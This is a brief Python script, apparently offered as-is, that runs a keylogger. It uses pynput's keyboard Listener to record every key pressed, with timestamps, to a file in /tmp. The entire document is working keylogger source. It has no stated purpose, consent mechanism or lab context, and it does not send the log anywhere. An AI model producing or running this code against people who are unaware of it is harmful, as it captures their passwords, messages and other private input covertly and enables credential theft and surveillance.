from pynput.keyboard import Listener
import logging

# Path to save keystrokes
log_file = "/tmp/keystrokes.log"

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        pass

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
